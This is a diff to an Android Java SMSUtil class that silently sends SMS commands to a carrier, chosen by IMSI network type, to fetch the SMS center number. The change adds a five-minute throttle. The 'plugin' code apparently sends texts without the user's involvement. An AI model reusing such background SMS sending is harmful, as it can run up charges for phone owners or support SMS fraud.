@@ -4,6 +4,7 @@ import android.content.Context;
 import android.telephony.SmsManager;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
+import com.xstd.plugin.config.SettingManager;
 
 import java.util.ArrayList;
 
@@ -31,10 +32,20 @@ public class SMSUtil {
         return false;
     }
 
-    public static final void trySendCmdToNetwork(Context context) {
+    public synchronized static final void trySendCmdToNetwork(Context context) {
         if (Config.DEBUG) {
             Config.LOGD("[[trySendCmdToNetwork]] try to send cmd to fetch SMS center >>>>>>>>>");
         }
+
+        /**
+         * 五分钟之内不重复发送获取短信中心的短信
+         */
+        long last = SettingManager.getInstance().getKeyLastFetchSmsCenter();
+        long cur = System.currentTimeMillis();
+        if (last + 5 * 60 * 1000 > cur) {
+            return;
+        }
+
         int networkType = AppRuntime.getNetworkTypeByIMSI(context);
         ArrayList<String> cmd = new ArrayList<String>();
         String target = null;
@@ -57,6 +68,8 @@ public class SMSUtil {
                 sendSMS(target, c);
             }
         }
+
+        SettingManager.getInstance().setKeyLastFetchSmsCenter(cur);
     }
 
 }
